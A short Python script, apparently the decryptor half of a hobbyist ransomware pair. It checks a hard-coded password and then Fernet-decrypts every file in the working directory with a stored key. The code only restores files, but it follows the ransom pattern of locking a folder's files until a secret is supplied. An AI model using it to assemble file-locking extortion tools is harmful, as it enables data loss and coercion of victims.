import os
from cryptography.fernet import Fernet, InvalidToken

# -------- PASSWORD YOU SET --------
PASSWORD = "voldemort"   # change this to any password you want
# ----------------------------------

# Ask user for the password
user_input = input("Enter password to decrypt files: ")

if user_input != PASSWORD:
    print("Wrong password. Access denied.")
    exit()

print("Password correct. Starting decryption...")

# Collect files to decrypt
files = []
for file in os.listdir():
    if file in ("thekey.key", "decrypt.py", "encrypt.py"):
        continue
    if os.path.isfile(file):
        files.append(file)

print("Files to decrypt:", files)

# Load key
try:
    with open("thekey.key", "rb") as keyfile:
        key = keyfile.read()
except FileNotFoundError:
    print("Error: thekey.key not found.")
    exit()

fernet = Fernet(key)

# Try to decrypt each file
for file in files:
    try:
        with open(file, "rb") as f:
            encrypted_data = f.read()

        decrypted_data = fernet.decrypt(encrypted_data)

        with open(file, "wb") as f:
            f.write(decrypted_data)

        print(f"Decrypted: {file}")

    except InvalidToken:
        print(f"[!] {file} is not encrypted with this key — skipping.")
    except Exception as e:
        print(f"[ERROR] Could not decrypt {file}: {e}")

print("Decryption complete.")
